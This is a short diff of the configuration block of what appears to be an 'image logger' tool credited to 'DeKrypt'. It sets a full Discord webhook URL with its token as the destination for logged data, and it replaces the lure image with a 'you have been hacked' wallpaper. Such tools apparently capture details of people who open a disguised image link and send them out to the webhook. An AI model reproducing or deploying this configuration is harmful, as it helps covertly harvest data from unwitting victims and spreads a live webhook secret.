@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1368100425986867210/17MGds2XxNurccPU_KYlfHXSWNufFmU3bOck1_UWGSwZBXwSLXSHlQ9Y4f6mok0x3s7b",
-    "image": "https://media.discordapp.net/attachments/1368100339055722596/1368101266261278720/IMG-20241230-WA0092.jpg?ex=6816ff17&is=6815ad97&hm=df8760a6eabff254368066409539067c4dd97fa42b920fdcc32b49d611f1856e&=&format=webp&width=648&height=648", # You can also have a custom image by using a URL argument
+    "image": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/2a6307b0-bf8c-4c90-9e5c-de4fc7922922/d7obwbx-9c4097f8-a958-4df2-b917-944be4aacc07.jpg/v1/fill/w_1024,h_576,q_75,strp/you_have_been_hacked_wallpaper_hd_by_psychobloodykiller_d7obwbx-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NTc2IiwicGF0aCI6IlwvZlwvMmE2MzA3YjAtYmY4Yy00YzkwLTllNWMtZGU0ZmM3OTIyOTIyXC9kN29id2J4LTljNDA5N2Y4LWE5NTgtNGRmMi1iOTE3LTk0NGJlNGFhY2MwNy5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.xDdfykxWJQ_l_ttcII_qbpF2DDHpcdzIZ9gAhfi-Hh4", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
